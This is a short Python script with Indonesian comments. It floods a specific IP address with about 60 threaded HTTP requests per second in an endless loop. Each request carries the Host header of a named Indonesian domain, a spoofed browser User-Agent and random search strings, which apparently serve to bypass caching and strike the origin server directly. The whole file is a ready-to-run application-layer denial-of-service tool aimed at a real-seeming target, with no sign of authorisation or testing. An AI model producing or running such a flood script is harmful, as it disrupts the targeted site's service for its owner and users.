import requests
import time
import threading
import random
import string

# IP server tujuan
TARGET_IP = "http://153.92.9.237"

# Domain aslinya
HOST_HEADER = "bisnisia.id"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Fungsi untuk melakukan request ke satu url
def curl(path="/"):
    url = f"{TARGET_IP}{path}"
    try:
        response = requests.get(url,
            headers={
                "Host": HOST_HEADER,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            },
            timeout=10,
            allow_redirects=True  # Sama seperti -L pada curl
        )
        print(f"[{time.strftime('%H:%M:%S')}] {url} Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[{time.strftime('%H:%M:%S')}] {url} Request failed: {e}")

# Fungsi utama untuk menjalankan 60 request per detik ke IP menggunakan Host header
def run_curl_perdetik():
    while True:
        threads = []
        for _ in range(60):
            path = f"/?s={random_string()}"
            t = threading.Thread(target=curl, args=(path,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        time.sleep(1)

if __name__ == "__main__":
    run_curl_perdetik()
